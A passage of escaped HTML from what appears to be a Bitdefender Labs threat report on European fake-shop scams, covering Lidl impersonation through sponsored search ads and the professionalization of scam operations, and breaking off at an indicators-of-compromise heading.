shops\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also found Lidl impersonation campaigns delivered through sponsored search advertisements. The fake storefronts visually mimicked Lidl branding and appeared directly within search results, making it more likely that consumers would mistake them for legitimate retailer listings.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F06\u002Flidl.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"468\" height=\"233\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"fake-shops-are-becoming-professionalized\"\u003EFake shops are becoming professionalized\u003C\u002Fh2\u003E\u003Cp\u003EThe investigation shows how fake-shop operators increasingly combine paid advertising, messaging platforms, counterfeit supply chains, and localized social engineering into coordinated campaigns spanning multiple countries.\u003C\u002Fp\u003E\u003Cp\u003ERather than relying on a single fraudulent website, operators rotate domains, impersonate multiple brands simultaneously and adapt the messages to local audiences. Some campaigns focus on harvesting payments while others prioritize collecting personal information, delivery addresses or credentials. Many do both.\u003C\u002Fp\u003E\u003Cp\u003EWith FIFA World Cup 2026-related scams already emerging and several campaigns showing signs of expanding elsewhere in Europe, consumers should expect fake-shop activity to continue growing throughout 2026.\u003C\u002Fp\u003E\u003Cp\u003EThe evolution from isolated scam websites to coordinated fake-commerce ecosystems suggests that fake shops will remain one of the most persistent consumer cyberthreats in Europe.\u003C\u002Fp\u003E\u003Ch2 id=\"indicators-of-compromise-iocs\"\u003EIndicators of compromise (IOCs)\u003C\u002Fh2\u003E\u003Ch3
